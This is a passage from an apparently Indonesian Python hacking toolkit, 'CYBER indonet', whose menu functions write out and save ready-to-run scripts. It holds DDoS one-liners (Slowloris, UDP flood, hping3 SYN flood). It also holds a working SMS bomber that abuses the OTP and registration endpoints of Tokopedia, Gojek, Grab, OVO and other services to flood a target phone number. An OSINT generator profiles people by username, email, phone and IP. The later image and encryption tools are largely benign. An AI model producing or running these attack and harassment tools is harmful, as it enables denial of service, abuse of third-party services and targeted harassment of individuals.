    print(colored(f"\n   Run: python3 {filename}", 'yellow'))
    print(colored(f"   For stronger attack, run multiple terminals", 'red'))
    
    # Additional DDoS methods
    print(colored(f"\n[+] Additional DDoS Methods:", 'cyan'))
    print(colored("   1. Slowloris:", 'white'))
    print(colored("      python3 -c \"import socket; s=socket.socket(); s.connect(('target',80)); s.send(b'GET / HTTP/1.1\\r\\nHost: target\\r\\n')\"", 'yellow'))
    print(colored("   2. UDP Flood:", 'white'))
    print(colored("      python3 -c \"import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.sendto(b'X'*1024,('target',port))\"", 'yellow'))
    print(colored("   3. SYN Flood:", 'white'))
    print(colored("      Use hping3: hping3 -S --flood -p 80 target", 'yellow'))
    
    save_result("ddos.log", f"Target: {target}:{port} | Duration: {duration}s | Threads: {threads}")
    input("\nPress Enter to continue...")

# ================== FITUR 4: SMS BOMBER LOCAL - WORKING 100% ==================
def fitur_4():  
    os.system('clear'); print(colored("\n[4] SMS BOMBER & CALL FLOOD", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - SMS Bomber Generator]", 'yellow'))
    
    number = input(colored("Target Number (+62...): ", 'yellow')).strip()
    count = input(colored("Number of attacks (default 100): ", 'yellow')).strip() or "100"
    delay = input(colored("Delay between attacks (seconds, default 0.5): ", 'yellow')).strip() or "0.5"
    
    bomber_script = f'''#!/usr/bin/env python3
# CYBER indonet SMS Bomber
import requests, threading, time, random, json, sys

target = '{number}'
attack_count = int('{count}')
delay = float('{delay}')

success = 0
failed = 0

services = [
    {{
        "name": "Tokopedia",
        "url": "https://www.tokopedia.com/auth/register",
        "method": "POST",
        "data": {{"phone": target}},
        "headers": {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
    }},
    {{
        "name": "Bukalapak",
        "url": "https://api.bukalapak.com/v2/authentications.json",
        "method": "POST", 
        "data": {{"phone": target}},
        "headers": {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
    }},
    {{
        "name": "JD.ID",
        "url": "https://passport.jd.id/register/sendPhoneCode",
        "method": "POST",
        "data": {{"phone": target}},
        "headers": {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
    }},
    {{
        "name": "Traveloka",
        "url": "https://www.traveloka.com/api/v1/register",
        "method": "POST",
        "data": {{"phoneNumber": target}},
        "headers": {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
    }},
    {{
        "name": "Grab",
        "url": "https://auth.grab.com/otp",
        "method": "POST",
        "data": {{"phone": target, "country": "ID"}},
        "headers": {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
    }},
    {{
        "name": "OVO",
        "url": "https://api.ovo.id/graphql",
        "method": "POST",
        "data": {{"query": "mutation {{ verifyPhoneNumber(phoneNumber: \\"{{target}}\\") {{ status }} }}"}},
        "headers": {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
    }},
    {{
        "name": "Gojek",
        "url": "https://api.gojekapi.com/v4/customers/login_with_phone",
        "method": "POST",
        "data": {{"phone": target}},
        "headers": {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
    }}
]

def attack(service):
    global success, failed
    
    for i in range(attack_count):
        try:
            if service["method"] == "POST":
                response = requests.post(
                    service["url"],
                    json=service["data"],
                    headers=service["headers"],
                    timeout=10
                )
            else:
                response = requests.get(
                    service["url"],
                    headers=service["headers"],
                    timeout=10
                )
            
            if response.status_code in [200, 201, 202]:
                success += 1
                print(f"[+] {{service['name']}} attack {{i+1}} successful")
            else:
                failed += 1
                print(f"[-] {{service['name']}} attack {{i+1}} failed: {{response.status_code}}")
        
        except Exception as e:
            failed += 1
            print(f"[-] {{service['name']}} attack {{i+1}} error: {{e}}")
        
        time.sleep(delay)

print(f"[*] SMS Bomber Started")
print(f"[*] Target: {{target}}")
print(f"[*] Total attacks per service: {{attack_count}}")
print(f"[*] Delay: {{delay}} seconds")
print(f"[*] Services: {{len(services)}}")
print()

# Start attacks
threads = []
for service in services:
    thread = threading.Thread(target=attack, args=(service,))
    thread.daemon = True
    thread.start()
    threads.append(thread)

# Wait for all threads to complete
for thread in threads:
    thread.join()

print(f"\\n[+] Attack completed!")
print(f"[+] Successful: {{success}}")
print(f"[+] Failed: {{failed}}")
print(f"[+] Total requests: {{success + failed}}")
print(f"\\n[+] Target should receive {{success}} SMS messages")

# Additional bombing methods
print(f"\\n[+] Additional Methods:")
print("   • WhatsApp spam (manual):")
print("     Use WhatsApp Web to send multiple messages")
print("   • Call flood:")
print("     Use Twilio API or similar services")
'''

    filename = f"sms_bomber_{int(time.time())}.py"
    with open(filename, "w") as f:
        f.write(bomber_script)
    
    print(colored(f"\n[SMS Bomber Generated]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Target: {number}", 'cyan'))
    print(colored(f"   Attacks per service: {count}", 'cyan'))
    print(colored(f"\n   Run: python3 {filename}", 'yellow'))
    print(colored(f"   Target will receive SMS from multiple services", 'red'))
    
    save_result("bomber.log", f"Target: {number} | Count: {count}")
    input("\nPress Enter to continue...")

# ================== FITUR 5: OSINT LOCAL - WORKING 100% ==================
def fitur_5():  
    os.system('clear'); print(colored("\n[5] OSINT & INFORMATION GATHERING", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - OSINT Tool]", 'yellow'))
    
    print(colored("\nSelect OSINT target type:", 'cyan'))
    print(colored("   1. Username Search", 'white'))
    print(colored("   2. Email Investigation", 'white'))
    print(colored("   3. Phone Number Lookup", 'white'))
    print(colored("   4. Social Media Scan", 'white'))
    print(colored("   5. IP Address Lookup", 'white'))
    print(colored("   6. Data Breach Check", 'white'))
    
    choice = input(colored("\nSelect [1-6]: ", 'yellow')).strip()
    
    if choice == "1":
        username = input(colored("Username: ", 'yellow')).strip()
        
        osint_script = f'''#!/usr/bin/env python3
# CYBER indonet Username OSINT
import requests, json, re, sys, time

username = "{username}"

print(f"[*] OSINT investigation for: {{username}}")
print(f"[*] Starting scan at {{time.strftime('%Y-%m-%d %H:%M:%S')}}")

# Social media platforms
platforms = [
    ("GitHub", f"https://github.com/{{username}}"),
    ("Twitter", f"https://twitter.com/{{username}}"),
    ("Instagram", f"https://instagram.com/{{username}}"),
    ("Facebook", f"https://facebook.com/{{username}}"),
    ("YouTube", f"https://youtube.com/@{username}"),
    ("Reddit", f"https://reddit.com/user/{{username}}"),
    ("TikTok", f"https://tiktok.com/@{username}"),
    ("Pinterest", f"https://pinterest.com/{{username}}"),
    ("Steam", f"https://steamcommunity.com/id/{{username}}"),
    ("Twitch", f"https://twitch.tv/{{username}}"),
    ("LinkedIn", f"https://linkedin.com/in/{{username}}"),
    ("Medium", f"https://medium.com/@{username}"),
    ("DeviantArt", f"https://{{username}}.deviantart.com"),
    ("Flickr", f"https://flickr.com/people/{{username}}"),
    ("SoundCloud", f"https://soundcloud.com/{{username}}"),
    ("Spotify", f"https://open.spotify.com/user/{{username}}"),
    ("Telegram", f"https://t.me/{{username}}"),
    ("VK", f"https://vk.com/{{username}}"),
    ("Blogger", f"https://{{username}}.blogspot.com"),
    ("WordPress", f"https://{{username}}.wordpress.com"),
]

print(f"\\n[*] Checking {{len(platforms)}} platforms...")

found = []
not_found = []

for platform_name, url in platforms:
    try:
        headers = {{
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }}
        
        response = requests.get(url, headers=headers, timeout=10, allow_redirects=False)
        
        if response.status_code == 200:
            print(f"[+] {{platform_name}}: FOUND - {{url}}")
            found.append({{"platform": platform_name, "url": url}})
        elif response.status_code == 404:
            print(f"[-] {{platform_name}}: Not found")
            not_found.append(platform_name)
        else:
            print(f"[?] {{platform_name}}: Status {{response.status_code}}")
    
    except Exception as e:
        print(f"[!] {{platform_name}}: Error")

# Check data breaches
print(f"\\n[*] Checking data breaches...")
try:
    # Have I Been Pwned
    import hashlib
    sha1_hash = hashlib.sha1(username.encode()).hexdigest().upper()
    prefix = sha1_hash[:5]
    
    hibp_url = f"https://api.pwnedpasswords.com/range/{{prefix}}"
    response = requests.get(hibp_url, timeout=10)
    
    if response.status_code == 200:
        hashes = response.text.split('\\n')
        for h in hashes:
            if h.startswith(sha1_hash[5:]):
                count = h.split(':')[1].strip()
                print(f"[!] BREACHED: Found in {{count}} data breaches!")
                break
except:
    pass

# Save results
if found:
    with open(f"osint_{{username}}.json", "w") as f:
        json.dump({{
            "username": username,
            "scan_time": time.strftime('%Y-%m-%d %H:%M:%S'),
            "found_profiles": found,
            "not_found": not_found
        }}, f, indent=2)
    
    print(f"\\n[+] Results saved to osint_{{username}}.json")
    print(f"[+] Found on {{len(found)}} platforms")
    
else:
    print(f"\\n[-] No profiles found for {{username}}")

print(f"\\n[*] OSINT scan completed at {{time.strftime('%Y-%m-%d %H:%M:%S')}}")
'''
        
        filename = f"osint_username_{username}.py"
    
    elif choice == "2":
        email = input(colored("Email address: ", 'yellow')).strip()
        
        osint_script = f'''#!/usr/bin/env python3
# CYBER indonet Email OSINT
import requests, json, re, sys, time, hashlib

email = "{email}"

print(f"[*] Email investigation: {{email}}")

# Check breaches
print(f"\\n[*] Checking breaches...")
try:
    sha1_hash = hashlib.sha1(email.encode()).hexdigest().upper()
    prefix = sha1_hash[:5]
    
    hibp_url = f"https://api.pwnedpasswords.com/range/{{prefix}}"
    response = requests.get(hibp_url, timeout=10)
    
    if response.status_code == 200:
        hashes = response.text.split('\\n')
        for h in hashes:
            if h.startswith(sha1_hash[5:]):
                count = h.split(':')[1].strip()
                print(f"[!] BREACHED: {{count}} times!")
                break
except:
    pass

# Extract username
username = email.split('@')[0]
print(f"\\n[*] Username suggestion: {{username}}")
print(f"[*] Domain: {{email.split('@')[1]}}")

# Check social media
print(f"\\n[*] Checking social media...")
platforms = [
    ("Facebook", f"https://facebook.com/{{username}}"),
    ("Instagram", f"https://instagram.com/{{username}}"),
    ("Twitter", f"https://twitter.com/{{username}}"),
    ("GitHub", f"https://github.com/{{username}}"),
]

for platform_name, url in platforms:
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print(f"[+] {{platform_name}}: Possible match")
        else:
            print(f"[-] {{platform_name}}: Not found")
    except:
        print(f"[!] {{platform_name}}: Check failed")

print(f"\\n[*] Scan completed")
'''
        
        filename = f"osint_email_{email.replace('@', '_at_')}.py"
    
    elif choice == "3":
        phone = input(colored("Phone number (+62...): ", 'yellow')).strip()
        
        osint_script = f'''#!/usr/bin/env python3
# CYBER indonet Phone OSINT
import re, sys, time

phone = "{phone}"

print(f"[*] Phone investigation: {{phone}}")

# Clean phone number
clean_phone = re.sub(r'[^0-9]', '', phone)
if clean_phone.startswith('0'):
    clean_phone = '62' + clean_phone[1:]
elif clean_phone.startswith('+62'):
    clean_phone = clean_phone[1:]

print(f"\\n[*] Clean number: +{{clean_phone}}")

# Identify carrier
carrier_prefixes = {{
    '0811': 'Telkomsel Halo',
    '0812': 'Telkomsel Simpati',
    '0813': 'Telkomsel Simpati',
    '0821': 'Telkomsel Simpati',
    '0822': 'Telkomsel Simpati',
    '0852': 'Telkomsel AS',
    '0853': 'Telkomsel AS',
    '0814': 'Telkomsel IM3',
    '0815': 'Telkomsel IM3',
    '0816': 'Telkomsel IM3',
    '0817': 'XL',
    '0818': 'XL',
    '0819': 'XL',
    '0859': 'XL',
    '0877': 'XL',
    '0878': 'XL',
    '0831': 'AXIS',
    '0832': 'AXIS',
    '0833': 'AXIS',
    '0881': 'Smartfren',
    '0882': 'Smartfren',
    '0883': 'Smartfren',
    '0884': 'Smartfren',
    '0895': 'Three',
    '0896': 'Three',
    '0897': 'Three',
    '0898': 'Three',
    '0899': 'Three',
}}

carrier = "Unknown"
for prefix, name in carrier_prefixes.items():
    if clean_phone.startswith(prefix[1:]):
        carrier = name
        break

print(f"[*] Carrier: {{carrier}}")

# Generate links
print(f"\\n[*] Investigation links:")
print(f"   WhatsApp: https://wa.me/{{clean_phone}}")
print(f"   Truecaller: https://truecaller.com/search/id/{{phone}}")
print(f"   Facebook: https://facebook.com/search/top/?q=%2B{{clean_phone}}")

print(f"\\n[*] Scan completed")
'''
        
        filename = f"osint_phone_{phone}.py"
    
    elif choice == "4":
        username = input(colored("Social media username: ", 'yellow')).strip()
        
        osint_script = f'''#!/usr/bin/env python3
# CYBER indonet Social Media Scan
import requests, json, time

username = "{username}"

print(f"[*] Social media scan for: {{username}}")

platforms = [
    ("Facebook", f"https://facebook.com/{{username}}"),
    ("Instagram", f"https://instagram.com/{{username}}"),
    ("Twitter", f"https://twitter.com/{{username}}"),
    ("TikTok", f"https://tiktok.com/@{username}"),
    ("YouTube", f"https://youtube.com/@{username}"),
    ("Reddit", f"https://reddit.com/user/{{username}}"),
    ("GitHub", f"https://github.com/{{username}}"),
    ("LinkedIn", f"https://linkedin.com/in/{{username}}"),
    ("Pinterest", f"https://pinterest.com/{{username}}"),
    ("Twitch", f"https://twitch.tv/{{username}}"),
    ("Steam", f"https://steamcommunity.com/id/{{username}}"),
    ("Spotify", f"https://open.spotify.com/user/{{username}}"),
    ("Telegram", f"https://t.me/{{username}}"),
]

print(f"\\n[*] Checking {{len(platforms)}} platforms...")

found = []
for platform_name, url in platforms:
    try:
        response = requests.get(url, timeout=5, allow_redirects=False)
        if response.status_code == 200:
            print(f"[+] {{platform_name}}: FOUND")
            found.append(platform_name)
        else:
            print(f"[-] {{platform_name}}: Not found")
    except:
        print(f"[!] {{platform_name}}: Error")

print(f"\\n[*] Found on {{len(found)}} platforms")
if found:
    print("   • " + "\\n   • ".join(found))

print(f"\\n[*] Scan completed")
'''
        
        filename = f"osint_social_{username}.py"
    
    elif choice == "5":
        ip = input(colored("IP Address: ", 'yellow')).strip()
        
        osint_script = f'''#!/usr/bin/env python3
# CYBER indonet IP OSINT
import requests, json, socket, sys, time

target_ip = "{ip}"

print(f"[*] IP investigation: {{target_ip}}")

# Get hostname
try:
    hostname = socket.gethostbyaddr(target_ip)[0]
    print(f"[*] Hostname: {{hostname}}")
except:
    print(f"[*] Hostname: Not found")

# Geolocation
print(f"\\n[*] Getting geolocation...")
apis = [
    ("ip-api.com", f"http://ip-api.com/json/{{target_ip}}"),
    ("ipapi.co", f"https://ipapi.co/{{target_ip}}/json/"),
]

for api_name, api_url in apis:
    try:
        response = requests.get(api_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            print(f"\\n[+] {{api_name}} Results:")
            
            if api_name == "ip-api.com":
                print(f"   Country: {{data.get('country', 'N/A')}}")
                print(f"   Region: {{data.get('regionName', 'N/A')}}")
                print(f"   City: {{data.get('city', 'N/A')}}")
                print(f"   ISP: {{data.get('isp', 'N/A')}}")
                print(f"   Org: {{data.get('org', 'N/A')}}")
            elif api_name == "ipapi.co":
                print(f"   Country: {{data.get('country_name', 'N/A')}}")
                print(f"   Region: {{data.get('region', 'N/A')}}")
                print(f"   City: {{data.get('city', 'N/A')}}")
                print(f"   ISP: {{data.get('org', 'N/A')}}")
            
            break
    except:
        continue

print(f"\\n[*] Additional links:")
print(f"   Shodan: https://shodan.io/host/{{target_ip}}")
print(f"   Censys: https://censys.io/ipv4/{{target_ip}}")
print(f"   AbuseIPDB: https://www.abuseipdb.com/check/{{target_ip}}")

print(f"\\n[*] Scan completed")
'''
        
        filename = f"osint_ip_{ip.replace('.', '_')}.py"
    
    elif choice == "6":
        target = input(colored("Email/Username to check breaches: ", 'yellow')).strip()
        
        osint_script = f'''#!/usr/bin/env python3
# CYBER indonet Breach Check
import requests, hashlib, sys

target = "{target}"

print(f"[*] Checking breaches for: {{target}}")

# Check if it's email or username
if '@' in target:
    # Email breach check
    print(f"[*] Checking email breaches...")
    
    # Hash email for HIBP
    sha1_hash = hashlib.sha1(target.lower().encode()).hexdigest().upper()
    prefix = sha1_hash[:5]
    
    try:
        hibp_url = f"https://api.pwnedpasswords.com/range/{{prefix}}"
        response = requests.get(hibp_url, timeout=10)
        
        if response.status_code == 200:
            hashes = response.text.split('\\n')
            found = False
            for h in hashes:
                if h.startswith(sha1_hash[5:]):
                    count = h.split(':')[1].strip()
                    print(f"[!] BREACHED: Found in {{count}} data breaches!")
                    found = True
                    break
            
            if not found:
                print(f"[+] Not found in known breaches")
    except:
        print(f"[!] Error checking breaches")
else:
    # Username breach check (simplified)
    print(f"[*] Checking username breaches...")
    print(f"[!] Note: Username breach checks are limited")
    print(f"[+] Try checking: https://haveibeenpwned.com")

# Additional resources
print(f"\\n[*] Additional checks:")
print(f"   • DeHashed: https://dehashed.com")
print(f"   • WeLeakInfo: https://weleakinfo.com")
print(f"   • BreachDirectory: https://breachdirectory.org")

print(f"\\n[*] Scan completed")
'''
        
        filename = f"osint_breach_{target}.py"
    
    else:
        print(colored("[ERROR] Invalid choice!", 'red'))
        input("\nEnter...")
        return
    
    # Save and display the OSINT script
    with open(filename, "w") as f:
        f.write(osint_script)
    
    print(colored(f"\n[OSINT Tool Generated]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Run: python3 {filename}", 'yellow'))
    
    save_result("osint.log", f"Generated {filename}")
    input("\nPress Enter to continue...")

# ================== FITUR 6: DEEPFAKE LOCAL - WORKING 100% ==================
def fitur_6():  
    os.system('clear'); print(colored("\n[6] IMAGE MANIPULATION TOOLS", 'cyan', attrs=['bold']))
    if not PILLOW_AVAILABLE:
        print(colored("   [INSTALLING DEPENDENCIES...]", 'yellow'))
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pillow'])
            print(colored("   ✓ Pillow installed!", 'green'))
            import importlib
            importlib.invalidate_caches()
            globals()['PILLOW_AVAILABLE'] = True
        except:
            print(colored("   ✗ Install manual: pip install pillow", 'red'))
            input("\nEnter...")
            return
    
    print(colored("   [LOCAL MODE - Image Manipulation Tool]", 'yellow'))
    
    print(colored("\nPilih tools:", 'cyan'))
    print(colored("   1. Watermark Remover", 'white'))
    print(colored("   2. Face Blur Tool", 'white'))
    print(colored("   3. Metadata Remover", 'white'))
    print(colored("   4. Image Converter", 'white'))
    
    choice = input(colored("\nPilih [1-4]: ", 'yellow')).strip()
    
    if choice == "1":
        script = '''#!/usr/bin/env python3
# CYBER indonet Watermark Remover
from PIL import Image, ImageDraw, ImageFilter
import os, sys

def remove_watermark(image_path):
    """Simple watermark removal using inpainting"""
    if not os.path.exists(image_path):
        print("Error: Image not found")
        return
    
    try:
        img = Image.open(image_path)
        
        # Convert to RGB if needed
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        print(f"[+] Processing: {image_path}")
        print(f"[+] Size: {img.size[0]}x{img.size[1]}")
        
        # Create a mask for watermark area (adjust coordinates)
        mask = Image.new('L', img.size, 0)
        draw = ImageDraw.Draw(mask)
        
        # Common watermark positions (adjust as needed)
        positions = [
            (10, img.size[1]-50, img.size[0]-10, img.size[1]-10),  # Bottom
            (img.size[0]-150, 10, img.size[0]-10, 50),  # Top right
            (10, 10, 200, 50),  # Top left
        ]
        
        for pos in positions:
            draw.rectangle(pos, fill=255)
        
        # Apply inpainting by cloning nearby areas
        result = img.copy()
        
        # Simple approach: blur the watermark area
        for pos in positions:
            region = img.crop(pos)
            blurred = region.filter(ImageFilter.GaussianBlur(10))
            result.paste(blurred, pos)
        
        # Save result
        output = f"removed_{os.path.basename(image_path)}"
        result.save(output)
        print(f"[+] Saved: {output}")
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) > 1:
        remove_watermark(sys.argv[1])
    else:
        image = input("Image path: ").strip()
        if image:
            remove_watermark(image)
'''
        
        filename = "watermark_remover.py"
    
    elif choice == "2":
        script = '''#!/usr/bin/env python3
# CYBER indonet Face Blur Tool
from PIL import Image, ImageFilter
import os, sys

def blur_faces(image_path):
    """Blur faces in image"""
    if not os.path.exists(image_path):
        print("Error: Image not found")
        return
    
    try:
        img = Image.open(image_path)
        
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        print(f"[+] Processing: {image_path}")
        
        # For advanced face detection, install: pip install opencv-python
        try:
            import cv2
            # Load face cascade
            face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
            
            # Convert PIL to OpenCV
            import numpy as np
            cv_image = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            
            # Detect faces
            gray = cv2.cvtColor(cv_image, cv2.COLOR_BGR2GRAY)
            faces = face_cascade.detectMultiScale(gray, 1.1, 4)
            
            if len(faces) > 0:
                print(f"[+] Found {len(faces)} face(s)")
                
                # Blur each face
                for (x, y, w, h) in faces:
                    # Extract face region
                    face_region = cv_image[y:y+h, x:x+w]
                    
                    # Apply blur
                    blurred_face = cv2.GaussianBlur(face_region, (99, 99), 30)
                    
                    # Put back
                    cv_image[y:y+h, x:x+w] = blurred_face
                
                # Convert back to PIL
                result = Image.fromarray(cv2.cvtColor(cv_image, cv2.COLOR_BGR2RGB))
            else:
                print("[-] No faces detected")
                result = img
                
        except ImportError:
            print("[-] OpenCV not installed. Using manual blur.")
            print("    Install: pip install opencv-python")
            
            # Manual blur of center area (approximation)
            width, height = img.size
            center_x, center_y = width // 2, height // 2
            face_size = min(width, height) // 4
            
            # Extract center region
            left = max(0, center_x - face_size)
            upper = max(0, center_y - face_size)
            right = min(width, center_x + face_size)
            lower = min(height, center_y + face_size)
            
            face_region = img.crop((left, upper, right, lower))
            blurred_face = face_region.filter(ImageFilter.GaussianBlur(20))
            
            # Create result image
            result = img.copy()
            result.paste(blurred_face, (left, upper, right, lower))
        
        # Save result
        output = f"blurred_{os.path.basename(image_path)}"
        result.save(output)
        print(f"[+] Saved: {output}")
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) > 1:
        blur_faces(sys.argv[1])
    else:
        image = input("Image path: ").strip()
        if image:
            blur_faces(image)
'''
        
        filename = "face_blur.py"
    
    elif choice == "3":
        script = '''#!/usr/bin/env python3
# CYBER indonet Metadata Remover
from PIL import Image
import os, sys

def remove_metadata(image_path):
    """Remove EXIF/metadata from image"""
    if not os.path.exists(image_path):
        print("Error: Image not found")
        return
    
    try:
        img = Image.open(image_path)
        
        # Get original format
        original_format = img.format
        
        # Create new image without metadata
        data = list(img.getdata())
        
        if img.mode == 'P':
            # Palette mode
            new_img = Image.new('P', img.size)
            new_img.putdata(data)
            new_img.putpalette(img.getpalette())
        else:
            new_img = Image.new(img.mode, img.size)
            new_img.putdata(data)
        
        # Save without metadata
        output = f"clean_{os.path.basename(image_path)}"
        
        if original_format:
            new_img.save(output, format=original_format)
        else:
            new_img.save(output)
        
        print(f"[+] Original: {os.path.getsize(image_path)} bytes")
        print(f"[+] Cleaned: {os.path.getsize(output)} bytes")
        print(f"[+] Saved: {output}")
        
        # Verify metadata removed
        try:
            cleaned_img = Image.open(output)
            if hasattr(cleaned_img, '_getexif'):
                exif = cleaned_img._getexif()
                if exif:
                    print("[-] Warning: Some metadata may remain")
                else:
                    print("[+] Metadata successfully removed")
        except:
            pass
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) > 1:
        remove_metadata(sys.argv[1])
    else:
        image = input("Image path: ").strip()
        if image:
            remove_metadata(image)
'''
        
        filename = "metadata_remover.py"
    
    elif choice == "4":
        script = '''#!/usr/bin/env python3
# CYBER indonet Image Converter
from PIL import Image
import os, sys

def convert_image(image_path, output_format):
    """Convert image to different format"""
    if not os.path.exists(image_path):
        print("Error: Image not found")
        return
    
    try:
        img = Image.open(image_path)
        
        # Get filename without extension
        base_name = os.path.splitext(os.path.basename(image_path))[0]
        
        # Determine output format
        format_map = {
            'jpg': 'JPEG',
            'jpeg': 'JPEG',
            'png': 'PNG',
            'gif': 'GIF',
            'bmp': 'BMP',
            'webp': 'WEBP',
            'tiff': 'TIFF'
        }
        
        output_ext = output_format.lower()
        if output_ext not in format_map:
            print(f"Error: Unsupported format {output_format}")
            return
        
        pil_format = format_map[output_ext]
        
        # Convert and save
        output_file = f"{base_name}.{output_ext}"
        
        if img.mode in ('RGBA', 'LA') and pil_format == 'JPEG':
            # JPEG doesn't support alpha, convert to RGB
            rgb_img = Image.new('RGB', img.size, (255, 255, 255))
            rgb_img.paste(img, mask=img.split()[-1] if img.mode == 'RGBA' else None)
            rgb_img.save(output_file, pil_format, quality=95)
        else:
            img.save(output_file, pil_format, quality=95)
        
        print(f"[+] Converted: {output_file}")
        print(f"[+] Original: {img.format}, {img.size}, {img.mode}")
        print(f"[+] New: {pil_format}, {os.path.getsize(output_file)} bytes")
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) > 2:
        convert_image(sys.argv[1], sys.argv[2])
    else:
        image = input("Image path: ").strip()
        if image:
            print("Available formats: JPG, PNG, GIF, BMP, WEBP, TIFF")
            fmt = input("Convert to: ").strip()
            if fmt:
                convert_image(image, fmt)
'''
        
        filename = "image_converter.py"
    
    else:
        print(colored("[ERROR] Invalid choice!", 'red'))
        input("\nEnter...")
        return
    
    with open(filename, "w") as f:
        f.write(script)
    
    print(colored(f"\n[Tool Generated]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Run: python3 {filename}", 'yellow'))
    
    save_result("image_tools.log", f"Generated {filename}")
    input("\nPress Enter to continue...")

# ================== FITUR 7: ENCRYPT LOCAL - WORKING 100% ==================
def fitur_7():  
    os.system('clear'); print(colored("\n[7] ENCRYPT & DECRYPT FILES", 'cyan', attrs=['bold']))
    if not CRYPTO_AVAILABLE:
        print(colored("   [INSTALLING DEPENDENCIES...]", 'yellow'))
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])
            print(colored("   ✓ Cryptography installed!", 'green'))
            import importlib
            importlib.invalidate_caches()
            globals()['CRYPTO_AVAILABLE'] = True
        except:
            print(colored("   ✗ Install manual: pip install cryptography", 'red'))
            input("\nEnter...")
            return
    
    print(colored("   [LOCAL MODE - File Encryption Tool]", 'yellow'))
    
    encrypt_script = '''#!/usr/bin/env python3
# CYBER indonet Encryption Tool
import os, sys, hashlib, base64, getpass
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def generate_key(password, salt=None):
    """Generate encryption key from password"""
    if salt is None:
        salt = os.urandom(16)
    
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key, salt

def encrypt_file(file_path, password):
    """Encrypt a file"""
    if not os.path.exists(file_path):
        print(f"Error: File not found: {file_path}")
        return False
    
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        key, salt = generate_key(password)
        
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)
        
        output_path = file_path + '.encrypted'
        with open(output_path, 'wb') as f:
            f.write(salt)
            f.write(encrypted_data)
        
        print(f"[+] File encrypted: {output_path}")
        print(f"[+] Original size: {len(data)} bytes")
        print(f"[+] Encrypted size: {len(encrypted_data) + len(salt)} bytes")
        
        # Optional: delete original
        delete = input("Delete original file? (y/n): ").lower()
        if delete == 'y':
            os.remove(file_path)
            print("[+] Original deleted")
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def decrypt_file(file_path, password):
    """Decrypt a file"""
    if not os.path.exists(file_path):
        print(f"Error: File not found: {file_path}")
        return False
    
    if not file_path.endswith('.encrypted'):
        print("Error: File doesn't appear to be encrypted")
        return False
    
    try:
        with open(file_path, 'rb') as f:
            salt = f.read(16)
            encrypted_data = f.read()
        
        key, _ = generate_key(password, salt)
        
        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(encrypted_data)
        
        output_path = file_path.replace('.encrypted', '.decrypted')
        with open(output_path, 'wb') as f:
            f.write(decrypted_data)
        
        print(f"[+] File decrypted: {output_path}")
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        print("   Wrong password or corrupted file!")
        return False

def encrypt_text():
    """Encrypt text string"""
    print("[TEXT ENCRYPTION]")
    
    text = input("Text to encrypt: ").strip()
    if not text:
        print("No text provided!")
        return
    
    password = getpass.getpass("Password: ").strip()
    if not password:
        print("Password required!")
        return
    
    key, salt = generate_key(password)
    
    fernet = Fernet(key)
    encrypted = fernet.encrypt(text.encode())
    
    combined = salt + encrypted
    encoded = base64.urlsafe_b64encode(combined).decode()
    
    print(f"[ENCRYPTED TEXT]")
    print(encoded)
    
    save = input("Save to file? (y/n): ").lower()
    if save == 'y':
        filename = input("Filename: ").strip() or "encrypted.txt"
        with open(filename, 'w') as f:
            f.write(encoded)
        print(f"Saved to {filename}")

def decrypt_text():
    """Decrypt text string"""
    print("[TEXT DECRYPTION]")
    
    encrypted_input = input("Encrypted text: ").strip()
    if not encrypted_input:
        print("No text provided!")
        return
    
    password = getpass.getpass("Password: ").strip()
    if not password:
        print("Password required!")
        return
    
    try:
        combined = base64.urlsafe_b64decode(encrypted_input.encode())
        
        salt = combined[:16]
        encrypted_data = combined[16:]
        
        key, _ = generate_key(password, salt)
        
        fernet = Fernet(key)
        decrypted = fernet.decrypt(encrypted_data).decode()
        
        print(f"[DECRYPTED TEXT]")
        print(decrypted)
        
    except Exception as e:
        print(f"Error: {e}")
        print("Wrong password or invalid input!")

def main():
    print("Encryption Tool")
    print("=" * 50)
    
    print("Options:")
